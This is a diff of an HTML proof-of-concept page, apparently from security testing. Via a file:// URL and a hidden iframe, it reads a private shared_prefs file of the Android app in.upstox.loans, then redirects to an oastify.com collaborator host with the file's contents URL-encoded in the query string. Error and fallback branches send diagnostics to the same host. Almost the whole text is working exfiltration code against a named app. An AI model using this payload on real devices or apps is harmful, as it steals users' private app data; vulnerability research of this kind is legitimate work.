@@ -1,13 +1,24 @@
 <html><body>
+<iframe id="f" src="file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml" style="display:none"></iframe>
 <script>
-var w = window.open("file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml");
 setTimeout(function() {
   try {
-    var data = w.document.body.innerText || w.document.body.textContent || w.document.documentElement.textContent || new XMLSerializer().serializeToString(w.document);
-    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_window_open?data=" + encodeURIComponent(data.substring(0,800));
+    var doc = document.getElementById('f').contentDocument;
+    var data = doc.documentElement.textContent || doc.documentElement.innerText || doc.body.textContent || doc.body.innerHTML;
+    if (!data || data.trim().length === 0) {
+      // Try getting all text nodes
+      var walker = doc.createTreeWalker(doc.documentElement, NodeFilter.SHOW_TEXT, null, false);
+      var texts = [];
+      while(walker.nextNode()) texts.push(walker.currentNode.textContent);
+      data = "WALKER:" + texts.join("|");
+    }
+    if (!data || data.trim().length === 0) {
+      data = "EMPTY:childNodes=" + doc.childNodes.length + ",docEl=" + doc.documentElement.nodeName + ",bodyChildren=" + (doc.body ? doc.body.childNodes.length : "nobody");
+    }
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_text?data=" + encodeURIComponent(data.substring(0,800));
   } catch(e) {
-    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_window_err?msg=" + encodeURIComponent(e.message);
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_text_err?msg=" + encodeURIComponent(e.message);
   }
-}, 3000);
+}, 2000);
 </script>
 </body></html>
